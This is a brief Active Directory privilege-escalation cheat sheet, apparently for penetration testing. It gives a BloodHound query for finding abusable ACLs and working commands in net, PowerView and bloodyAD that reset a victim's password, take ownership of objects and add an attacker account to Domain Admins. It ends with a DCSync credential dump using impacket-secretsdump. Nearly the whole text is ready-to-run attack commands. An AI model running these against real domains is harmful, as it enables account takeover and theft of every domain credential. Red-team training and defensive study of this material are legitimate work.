# Find interesting ACLs with BloodHound
# Query: MATCH p=(u:User)-[:GenericAll|WriteOwner|WriteDacl|AllExtendedRights]->(g:Group) RETURN p

# GenericAll on user - reset password
net user target_user NewPassword123! /domain

# GenericAll on group - add yourself
net group "Domain Admins" attacker_user /add /domain

# WriteOwner - take ownership then add yourself
# Using PowerView
Set-DomainObjectOwner -Identity target_user -OwnerIdentity attacker_user
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker_user -Rights All
net group "Domain Admins" attacker_user /add /domain

# Using bloodyAD
bloodyAD -d domain.local -u attacker_user -p pass --host $DC add groupMember "Domain Admins" attacker_user

# DCSync attack (if you have Replicating Directory Changes rights)
impacket-secretsdump domain.local/attacker_user:pass@$DC -just-dc